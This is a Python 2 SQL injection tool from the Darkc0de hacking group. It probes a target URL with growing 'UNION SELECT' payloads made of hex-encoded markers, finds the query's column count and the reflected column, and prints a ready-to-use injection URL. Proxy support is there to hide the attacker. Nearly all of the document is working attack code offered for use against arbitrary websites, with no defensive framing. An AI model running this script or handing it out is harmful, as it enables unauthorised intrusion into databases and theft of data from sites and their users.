#!/usr/bin/python
#SQLi column finder
#This script finds the number of columns in a SQLi and a null column!
#thats the short and sweet of it.
#the site must be vuln to SQLi for this to work
#If your sure its vuln to SQLi and its not finding the columns there are 2 possibilities.
#1. only vuln to blind SQLi
#2. it has over 100 columns increase to 200.. (never seen one with more than 200 columns)

# Darkc0de Team 
# www.darkc0de.com 
# rsauron[at]gmail[dot]com

# Greetz to 
# d3hydr8, Tarsian, c0mrade (r.i.p brotha), reverenddigitalx
# and the rest of the Darkc0de members

import sys, re, socket, httplib, urllib2

#Maximum Number of Columns this Script will check for!
#Change this if you think column length for target site is greater then 100
colMax = 100
#Add proxy support: Format  127.0.0.1:8080
proxy = "None"

print "\n   rsauron:darkc0de.com Column Lenth Finder v1.0"
print "---------------------------------------------------"

if len(sys.argv) != 2: 
	print "\n\tUsage: ./colfinder.py <vulnSQLi>" 
	print "\n\tEx: ./colfinder.py \"www.site.com/news.php?id=22\"\n" 
	sys.exit(1)

siteorig = sys.argv[1]
if siteorig[:7] != "http://": 
	siteorig = "http://"+siteorig

try:
	if proxy != "None":
		print "\n[+] Testing Proxy..."
		h2 = httplib.HTTPConnection(proxy)
		h2.connect()
		print "[+] Proxy:",proxy
		print "[+] Building Handler"
		proxy_handler = urllib2.ProxyHandler({'http': 'http://'+proxy+'/'})
	else:
		print "\n[-] Proxy Not Given"
		proxy_handler = ""
except(socket.timeout):
	print "\n[-] Proxy Timed Out"
	sys.exit(1)
except(), msg:
	print msg
	print "\n[-] Proxy Failed"
	sys.exit(1)

print "[+] Attempting To find the number of columns..."
checkfor=[]
firstgo = "True"
site = siteorig+"+AND+1=2+UNION+SELECT+"
makepretty = ""
for a in xrange(0,colMax):
        a = str(a)
        darkc0de = "darkcode"+a
        checkfor.append(darkc0de)
	opener = urllib2.build_opener(proxy_handler)
	if firstgo == "True":
                site = site+"0x"+darkc0de.encode("hex")
                firstgo = "False"
        else:
                site = site+",0x"+darkc0de.encode("hex")
        finalurl = site+"--"
	source = opener.open(finalurl).read()
        for b in checkfor:
                colFound = re.findall(b,source)
                if len(colFound) >= 1:
                        print "[+] Column Length is:",len(checkfor)
                        b = re.findall(("[\d]"),b)
                        print "[+] Found null column at column #:",b[0]
                        firstgo = "True"
                        for c in xrange(0,len(checkfor)):
                                if firstgo == "True":
                                        makepretty = makepretty+str(c)
                                        firstgo = "False"
                                else:
                                        makepretty = makepretty+","+str(c)
                        print "[+] Site URL:",siteorig+"+AND+1=2+UNION+SELECT+"+makepretty+"--"
                        print "[-] Done!\n"
                        sys.exit(1)
print "[-] Sorry Column Length could not be found."
print "[-] Try increasing colMax variable. or site is not injectable"
print "[-] Done\n"
